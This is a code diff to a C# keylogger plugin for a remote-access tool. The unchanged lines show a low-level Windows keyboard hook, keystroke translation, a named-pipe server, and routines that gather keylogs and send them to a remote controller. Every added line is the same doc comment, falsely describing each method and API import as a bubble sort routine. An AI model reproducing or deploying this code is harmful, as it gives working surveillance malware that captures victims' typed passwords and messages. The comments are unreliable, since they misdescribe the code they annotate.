@@ -25,6 +25,12 @@ namespace Plugin
         string pipename = "OfflineKeyloggerPipe";
         NamedPipeClientStream client;
         Node node;
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Run(Node node)// get server side intergation (I mean like xeno-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
         {
             await node.SendAsync(new byte[] { 3 });
@@ -107,11 +113,21 @@ namespace Plugin
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public bool PipeExists() 
         {
             return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{pipename}");
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task StartServer() 
         {
 
@@ -130,6 +146,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Handler(NamedPipeServerStream server) 
         {
             while (!FULLSTOP)
@@ -201,6 +222,11 @@ namespace Plugin
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task DO_FULLSTOP() 
         {
             if (owner) 
@@ -222,6 +248,11 @@ namespace Plugin
             catch { }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (started && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -243,7 +274,11 @@ namespace Plugin
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task keylogloop() 
         {
             while (!FULLSTOP) 
@@ -265,6 +300,11 @@ namespace Plugin
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static byte[] ConvertDictionaryToBytes(Dictionary<string, string> dictionary)
         {
             List<byte> byteList = new List<byte>();
@@ -280,6 +320,11 @@ namespace Plugin
             return byteList.ToArray();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
         {
             Dictionary<string, string> dictionary = new Dictionary<string, string>();
@@ -315,8 +360,11 @@ namespace Plugin
             return dictionary;
         }
 
-
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<Dictionary<string, string>> GetKeylogs(int count=0) 
         {
             if (count > 3)
@@ -374,6 +422,12 @@ namespace Plugin
             }
 
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Start() 
         {
             if (owner && !started)
@@ -394,6 +448,12 @@ namespace Plugin
             }
             await client.WriteAsync(new byte[] { 2 }, 0, 1);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Stop()
         {
             if (owner)
@@ -410,6 +470,12 @@ namespace Plugin
             }
             await client.WriteAsync(new byte[] { 3 }, 0, 1);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> IsStarted(int count=0) 
         {
             if (count > 3) 
@@ -434,6 +500,12 @@ namespace Plugin
                 return await IsStarted(count + 1);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<string> GetKey()
         {
             return await Task.Run(() =>
@@ -528,6 +600,11 @@ namespace Plugin
 
         private static bool[] keyStates = new bool[256];
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
         {
             StringBuilder receivingBuffer = new StringBuilder(5);
@@ -588,29 +665,64 @@ namespace Plugin
             return string.Empty;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
         public static extern short GetKeyState(int keyCode);
 
         public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         public static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x100;
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
             [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
